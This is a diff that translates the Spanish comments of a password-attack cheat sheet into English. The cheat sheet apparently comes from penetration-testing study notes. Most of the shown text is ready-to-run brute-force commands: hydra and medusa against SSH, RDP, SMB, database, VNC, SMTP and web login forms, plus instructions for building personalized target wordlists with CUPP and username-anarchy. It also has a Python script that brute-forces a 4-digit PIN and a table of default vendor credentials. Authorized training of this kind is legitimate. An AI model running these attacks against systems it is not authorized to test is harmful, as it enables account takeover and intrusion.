@@ -64,7 +64,7 @@ hydra -L users.txt -P passes.txt -s 2121 target ftp
 
 # RDP
 hydra -l administrator -P passes.txt rdp://target
-# Con charset generado (no dict):
+# With generated charset (no dict):
 hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 target rdp
 
 # SMB
@@ -76,13 +76,13 @@ hydra -l root -P passes.txt mysql://target
 # MSSQL
 hydra -l sa -P passes.txt mssql://target
 
-# VNC (sin usuario)
+# VNC (no username)
 hydra -P passes.txt vnc://target
 
 # SMTP
 hydra -l admin -P passes.txt smtp://mail.target.com
 
-# Múltiples targets
+# Multiple targets
 hydra -l root -p toor -M targets.txt ssh
 ```
 
@@ -99,17 +99,17 @@ hydra -l admin -P passes.txt target http-get / -s 81
 ### POST Form — Params String Structure
 
 ```bash
-# Formato: "/path:campo1=^USER^&campo2=^PASS^:F=texto_de_error"
-# O con success: "...:S=302" / "...:S=Dashboard"
+# Format: "/path:field1=^USER^&field2=^PASS^:F=error_text"
+# Or with success: "...:S=302" / "...:S=Dashboard"
 
 hydra -L users.txt -P passes.txt IP -s PORT -f http-post-form \
   "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 
-# Con CSRF token estático
+# With static CSRF token
 hydra -L users.txt -P passes.txt target http-post-form \
   "/login:_token=STATIC_TOKEN&username=^USER^&password=^PASS^:F=Invalid"
 
-# Success por redirect 302
+# Success on 302 redirect
 hydra -l admin -P passes.txt target http-post-form \
   "/login:user=^USER^&pass=^PASS^:S=302"
 ```
@@ -117,11 +117,11 @@ hydra -l admin -P passes.txt target http-post-form \
 ### Identifying the Params String
 
 ```bash
-# 1. Abrir DevTools (F12) → Network tab
-# 2. Hacer submit con creds incorrectas
-# 3. Ver petición POST → Form Data → anotar campo nombres
-# 4. Ver respuesta → anotar mensaje de error ("Invalid credentials", etc.)
-# O usar Burp Suite para interceptar y analizar
+# 1. Open DevTools (F12) → Network tab
+# 2. Submit with incorrect credentials
+# 3. View POST request → Form Data → note down field names
+# 4. View response → note down error message ("Invalid credentials", etc.)
+# Or use Burp Suite to intercept and analyze
 ```
 
 ---
@@ -129,7 +129,7 @@ hydra -l admin -P passes.txt target http-post-form \
 ## Medusa — Base Syntax
 
 ```bash
-medusa -h HOST -u USER -P passes.txt -M MODULE [opciones]
+medusa -h HOST -u USER -P passes.txt -M MODULE [options]
 ```
 
 | Flag | Description |
@@ -153,10 +153,10 @@ medusa -h 192.168.1.100 -U users.txt -P passes.txt -M ssh -t 3
 # FTP
 medusa -h 127.0.0.1 -u ftpuser -P passes.txt -M ftp -t 5
 
-# HTTP Basic Auth — múltiples targets
+# HTTP Basic Auth — multiple targets
 medusa -H web_servers.txt -U users.txt -P passes.txt -M http -m GET
 
-# Password vacía o user=pass
+# Empty password or user=pass
 medusa -h 10.0.0.5 -U users.txt -e ns -M ssh
 
 # Web form
@@ -171,46 +171,46 @@ medusa -M web-form -h target -U users.txt -P passes.txt \
 ### CUPP — OSINT Profile Wordlist
 
 ```bash
-# Instalar
+# Install
 sudo apt install cupp -y
 
-# Modo interactivo — genera wordlist personalizada
+# Interactive mode — generates a customized wordlist
 cupp -i
-# Responder preguntas: nombre, apodo, cumpleaños, pareja, mascota, empresa, keywords
-# Genera: jane.txt con ~46000 passwords personalizadas
+# Answer the prompts: name, nickname, birthday, partner, pet, company, keywords
+# Generates: jane.txt with ~46000 personalized passwords
 
-# Otros modos
-cupp -l    # descargar listas de alg database
-cupp -a    # solo modo interactivo básico
+# Other modes
+cupp -l    # download lists from a database
+cupp -a    # basic interactive mode only
 ```
 
 ### Username Anarchy — Generating Name Variations
 
 ```bash
-# Instalar
+# Install
 sudo apt install ruby -y
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
 
-# Generar usernames para un nombre
+# Generate usernames for a given name
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 
-# Genera: jane, janesmith, j.smith, smithj, jsmith, js, etc.
+# Generates: jane, janesmith, j.smith, smithj, jsmith, js, etc.
 ```
 
 ### Filtering Wordlists by Password Policy
 
 ```bash
-# Política: mínimo 8 chars + uppercase + lowercase + número
-grep -E '^.{8,}$' wordlist.txt |       # mínimo 8 chars
-grep -E '[A-Z]' |                       # al menos una mayúscula
-grep -E '[a-z]' |                       # al menos una minúscula
-grep -E '[0-9]' > filtered.txt          # al menos un número
+# Policy: minimum 8 chars + uppercase + lowercase + digit
+grep -E '^.{8,}$' wordlist.txt |       # at least 8 chars
+grep -E '[A-Z]' |                       # at least one uppercase
+grep -E '[a-z]' |                       # at least one lowercase
+grep -E '[0-9]' > filtered.txt          # at least one digit
 
-# Añadir requisito de 2+ caracteres especiales
+# Add requirement of 2+ special characters
 grep -E '([!@#$%^&*].*){2,}' filtered.txt > filtered_special.txt
 
-# Verificar tamaño
+# Check size
 wc -l filtered.txt
 ```
 
@@ -224,7 +224,7 @@ import requests
 ip = "TARGET_IP"
 port = 1234
 
-# Fuerza bruta PIN de 4 dígitos
+# Brute-force 4-digit PIN
 for pin in range(10000):
     formatted_pin = f"{pin:04d}"
     response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
@@ -268,7 +268,7 @@ for password in passwords:
 | Ubiquiti UniFi | ubnt | ubnt |
 
 ```bash
-# Wordlist de default credentials
+# Default credentials wordlist
 /opt/useful/seclists/Passwords/Default-Credentials/default-passwords.txt
 ```
 
